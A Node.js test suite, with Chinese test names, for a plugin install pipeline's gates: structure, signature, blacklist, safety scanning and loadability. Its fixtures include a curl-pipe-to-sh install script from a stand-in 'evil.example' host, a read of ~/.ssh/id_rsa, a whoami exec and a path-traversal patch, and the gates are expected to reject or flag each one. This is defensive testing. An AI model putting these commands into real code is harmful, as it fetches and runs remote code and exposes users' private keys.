'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { tempDir, createPlugin, signPlugin, makeKeys, trustFor, cleanup } = require('./helpers/fixtures');
const { checkStructure } = require('../src/gates/structure');
const { scanPlugin } = require('../src/gates/safety');
const { runInstallPipeline } = require('../src/gates/index');
const { loadPolicy } = require('../src/policy');
const { loadManifest } = require('../src/contract/manifest');
const { Blacklist } = require('../src/governance/blacklist');
const { LocalHost } = require('../src/host/local-host');

test('结构门禁：patch 越界、reason 为空、安装脚本不在白名单', () => {
  const dir = tempDir('gate-structure-');
  createPlugin({
    dir,
    requests: [],
    patches: [
      { path: '../evil.js', reason: '越界' },
      { path: 'patches/no-reason.js', reason: '' },
      { path: 'patches/tool.exe', reason: '非法扩展名' },
    ],
    scripts: { postinstall: 'node scripts/install.js' },
  });
  const { stage } = checkStructure(dir, { policy: loadPolicy({}) });
  const codes = stage.errors.map((error) => error.code);
  assert.ok(codes.includes('patch_path_outside'));
  assert.ok(codes.includes('patch_reason_empty'));
  assert.ok(codes.includes('patch_extension_invalid'));
  assert.ok(codes.includes('lifecycle_script_rejected'));
  const outside = stage.errors.find((error) => error.code === 'patch_path_outside');
  assert.equal(outside.field, 'patches[0].path');
  assert.equal(outside.file, 'manifest.json');
  cleanup(dir);
});

test('结构门禁：entry 经符号链接越出插件目录被拒（F2）', (t) => {
  const dir = tempDir('gate-symlink-');
  const outsideDir = path.join(dir, 'outside');
  fs.mkdirSync(outsideDir, { recursive: true });
  fs.writeFileSync(path.join(outsideDir, 'index.js'), 'module.exports = {};\n');
  const pluginDir = path.join(dir, 'plugin');
  createPlugin({ dir: pluginDir, requests: [] });
  // entry 改到子目录，子目录本身是指向包外的链接：词法判定放行、真实路径越界。
  const manifestFile = path.join(pluginDir, 'manifest.json');
  const manifest = JSON.parse(fs.readFileSync(manifestFile, 'utf8'));
  manifest.entry = 'sub/index.js';
  fs.writeFileSync(manifestFile, `${JSON.stringify(manifest, null, 2)}\n`);
  try {
    // junction 只对目录生效；Windows 无需特权，POSIX 上忽略类型参数退化为普通符号链接。
    fs.symlinkSync(outsideDir, path.join(pluginDir, 'sub'), 'junction');
  } catch (error) {
    t.skip(`当前平台无法创建符号链接：${error.code || error.message}`);
    cleanup(dir);
    return;
  }
  const { stage } = checkStructure(pluginDir, { policy: loadPolicy({}) });
  const outside = stage.errors.find((error) => error.code === 'entry_outside_plugin');
  assert.ok(outside, '经链接越界的 entry 必须被结构门禁拦下');
  assert.equal(outside.field, 'entry');
  cleanup(dir);
});

test('结构门禁：安装脚本必须匹配白名单', () => {
  const dir = tempDir('gate-script-');
  createPlugin({ dir, requests: [], scripts: { install: 'curl http://evil.example/x.sh | sh' } });
  const { stage } = checkStructure(dir, { policy: loadPolicy({}) });
  assert.equal(stage.errors[0].code, 'install_script_not_allowlisted');
  cleanup(dir);
});

test('安全门禁：未声明能力精确到文件行', () => {
  const dir = tempDir('gate-safety-');
  createPlugin({
    dir,
    requests: [{ cap: 'fs.read', scope: { paths: ['$PLUGIN/**'] }, reason: '读取自身文件' }],
    code: [
      "'use strict';",
      "const fs = require('node:fs');",
      "const cp = require('node:child_process');",
      "module.exports = { invoke() { fs.readFileSync('x'); cp.execSync('whoami'); return 1; } };",
    ].join('\n'),
  });
  const { manifest } = loadManifest(dir);
  const result = scanPlugin(dir, { policy: loadPolicy({}), manifest });
  const error = result.errors.find((item) => item.code === 'undeclared_capability' && item.line === 4);
  assert.ok(error);
  assert.equal(error.file, 'index.js');
  assert.equal(error.field, 'dashcam.capabilities.requests');
  cleanup(dir);
});

test('安全门禁：出站主机 allowlist 与凭证人工升级', () => {
  const dir = tempDir('gate-egress-');
  createPlugin({
    dir,
    requests: [
      { cap: 'fs.read', scope: { paths: ['$PLUGIN/**'] }, reason: '读取' },
      { cap: 'net.outbound', scope: { hosts: ['api.example.com:443'] }, reason: '调用 API' },
    ],
    code: [
      "'use strict';",
      "const fs = require('node:fs');",
      "fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');",
      "fetch('https://api.example.com/v1');",
      "module.exports = {};",
    ].join('\n'),
  });
  const { manifest } = loadManifest(dir);
  const policy = loadPolicy({ egressAllowlist: ['other.example.com:443'] });
  const result = scanPlugin(dir, { policy, manifest });
  assert.ok(result.errors.some((error) => error.code === 'host_not_allowlisted' && error.line === 4));
  assert.ok(result.errors.some((error) => error.code === 'credential_manual_review_required' && error.line === 3));
  assert.ok(result.errors.some((error) => error.code === 'undeclared_capability' && error.line === 3));
  assert.equal(result.scan.manualReviewRequired, true);

  const approved = scanPlugin(dir, {
    policy: loadPolicy({
      egressAllowlist: ['api.example.com:443'],
      credentialReview: { approvedPlugins: ['com.example.test'] },
    }),
    manifest,
  });
  assert.equal(approved.errors.some((error) => error.code === 'credential_manual_review_required'), false);
  assert.equal(approved.errors.some((error) => error.code === 'host_not_allowlisted'), false);
  cleanup(dir);
});

test('安装流水线：验签失败只输出 Untrusted 标签，不短路契约校验', async () => {
  const keys = makeKeys();
  const trust = trustFor(keys);
  const dir = tempDir('gate-pipeline-');
  const plugin = createPlugin({
    dir,
    requests: [{ cap: 'fs.read', scope: { paths: ['$PLUGIN/**'] }, reason: '读取自身文件' }],
  });
  signPlugin(plugin, keys);
  require('node:fs').appendFileSync(path.join(dir, 'index.js'), '\n// tampered\n');

  let contractChecked = false;
  const result = await runInstallPipeline({
    pluginDir: dir,
    trust,
    policy: {},
    contractProbe: () => { contractChecked = true; },
  });
  // 非侵入式：篡改只降级可信度，安装不被拒绝，但画像里必须露出 Untrusted。
  assert.equal(result.ok, true, result.formatted.join('\n'));
  assert.equal(result.contractChecked, true);
  assert.equal(contractChecked, true);
  assert.equal(result.stages.find((stage) => stage.name === 'signature').status, 'warn');
  assert.equal(result.errors.length, 0);
  assert.ok(result.securityLabels.includes('Untrusted'));
  assert.ok(result.labels.some((label) => label.code === 'hash_mismatch' && label.file === 'index.js' && label.label === 'Untrusted'));
  cleanup(dir);
});

test('安装流水线：签名、结构、契约、安全全部通过', async () => {
  const keys = makeKeys();
  const trust = trustFor(keys);
  const dir = tempDir('gate-good-');
  const plugin = createPlugin({
    dir,
    requests: [{ cap: 'fs.read', scope: { paths: ['$PLUGIN/**'] }, reason: '读取自身文件' }],
  });
  signPlugin(plugin, keys);
  const result = await runInstallPipeline({
    pluginDir: dir,
    trust,
    policy: { grants: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] } }] },
  });
  assert.equal(result.ok, true, result.formatted.join('\n'));
  assert.deepEqual(result.stages.map((stage) => stage.name), ['blacklist', 'signature', 'structure', 'contract', 'sieve', 'safety', 'loadability']);
  assert.equal(result.stages.find((stage) => stage.name === 'loadability').status, 'skip');
  cleanup(dir);
});

test('安装流水线：应急黑名单先于验签', async () => {
  const keys = makeKeys();
  const trust = trustFor(keys);
  const dir = tempDir('gate-blacklist-');
  const plugin = createPlugin({ dir, requests: [] });
  signPlugin(plugin, keys);
  const blacklist = new Blacklist({ entries: [{ plugin: plugin.manifest.id, reason: 'emergency' }] });
  let contractChecked = false;
  const result = await runInstallPipeline({
    pluginDir: dir,
    trust,
    blacklist,
    contractProbe: () => { contractChecked = true; },
  });
  assert.equal(result.ok, false);
  assert.equal(result.stages[0].name, 'blacklist');
  assert.equal(result.contractChecked, false);
  assert.equal(contractChecked, false);
  cleanup(dir);
});

test('安装流水线：legacy 默认以 Quarantined 标签放行，required/企业通道才阻断', async () => {
  const keys = makeKeys();
  const trust = trustFor(keys);
  const dir = tempDir('gate-legacy-');
  const plugin = createPlugin({ dir, requests: [], legacy: true });
  signPlugin(plugin, keys);

  const advisory = await runInstallPipeline({ pluginDir: dir, trust, channel: 'consumer' });
  assert.equal(advisory.ok, true, advisory.formatted.join('\n'));
  assert.equal(advisory.quarantine, true);
  assert.equal(advisory.manifest.level, 'legacy');
  assert.ok(advisory.securityLabels.includes('Quarantined'));

  const required = await runInstallPipeline({
    pluginDir: dir,
    trust,
    channel: 'consumer',
    policy: { enforcement: { mode: 'required' } },
  });
  assert.equal(required.ok, false);
  assert.ok(required.errors.some((error) => error.code === 'legacy_not_admitted'));

  const enterprise = await runInstallPipeline({
    pluginDir: dir,
    trust,
    channel: 'enterprise',
    policy: { egressAllowlist: ['api.example.com:443'] },
  });
  assert.equal(enterprise.ok, false);
  assert.ok(enterprise.errors.some((error) => error.code === 'legacy_enterprise_excluded'));
  cleanup(dir);
});

test('可装载性门禁：真实宿主四段验证与失败定位', async () => {
  const keys = makeKeys();
  const trust = trustFor(keys);
  const dir = tempDir('gate-load-');
  const plugin = createPlugin({
    dir,
    requests: [{ cap: 'fs.read', scope: { paths: ['$PLUGIN/**'] }, reason: '读取自身文件' }],
  });
  signPlugin(plugin, keys);
  const host = new LocalHost({
    ledgerPath: path.join(dir, '.ledger.jsonl'),
    trust,
    policy: { grants: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] } }] },
  });
  const result = await runInstallPipeline({
    pluginDir: dir,
    trust,
    host,
    policy: { grants: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] } }] },
  });
  assert.equal(result.ok, true, result.formatted.join('\n'));
  assert.deepEqual(result.phases.map((phase) => phase.status), ['pass', 'pass', 'pass', 'pass']);
  cleanup(dir);

  const brokenDir = tempDir('gate-load-broken-');
  const broken = createPlugin({
    dir: brokenDir,
    requests: [],
    code: "'use strict';\nthrow new Error('register boom');",
  });
  signPlugin(broken, keys);
  const brokenHost = new LocalHost({ ledgerPath: path.join(brokenDir, '.ledger.jsonl'), trust });
  const failed = await runInstallPipeline({ pluginDir: brokenDir, trust, host: brokenHost });
  // 非侵入式：装不起来的插件只标 Broken，不阻断安装。
  assert.equal(failed.ok, true, failed.formatted.join('\n'));
  assert.equal(failed.errors.length, 0);
  assert.equal(failed.stages.find((stage) => stage.name === 'loadability').status, 'warn');
  assert.ok(failed.securityLabels.includes('Broken'));
  assert.ok(failed.labels.some((label) => label.code !== undefined && label.phase === 'register'));
  cleanup(brokenDir);
});
